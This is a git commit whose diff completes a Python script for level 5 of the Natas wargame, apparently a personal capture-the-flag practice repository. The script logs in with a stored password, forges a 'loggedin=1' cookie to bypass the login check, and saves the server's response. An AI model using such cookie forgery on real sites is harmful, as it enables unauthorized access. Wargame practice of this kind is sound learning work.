679c8fb969e572432a726b8a2e61594c29faa75b
niroj <nirojnaik12@gmail.com>
2026-01-27 16:07:00 +0530

    natas6 password update and natas script lvl5-6 has now been functional

--- scripts/natas5-6.py
+++ scripts/natas5-6.py
@@ -3,6 +3,27 @@ import requests
 userName = 'natas5'
 fileContent = open('C:\\Users\\niroj\\Documents\\Natas\\password.txt') 
 password = fileContent.readlines()[4][7:39] 
-print(password)
+print(f"The password of natas5 is {password}\n")
 
-url = f'{userName}.natas.labs.overthewire.org'
+url = f'http://{userName}.natas.labs.overthewire.org'
+
+cookies = {
+    'loggedin': '1'
+}
+
+response = requests.get(url, auth = (userName, password), cookies = cookies)
+htmlDoc = response.text
+
+# it will allow us to see the headers 
+print(response.headers) 
+
+print("\n")
+
+print(htmlDoc)
+
+try:
+    with open('C:\\Users\\niroj\\Documents\\Natas\\scripts\\temp\\index.html', 'w') as htmlContent:
+        htmlContent.writelines(htmlDoc)
+        print("Operation Success!")
+except IOError as e:
+    print(f'Unexpected though: {e}')
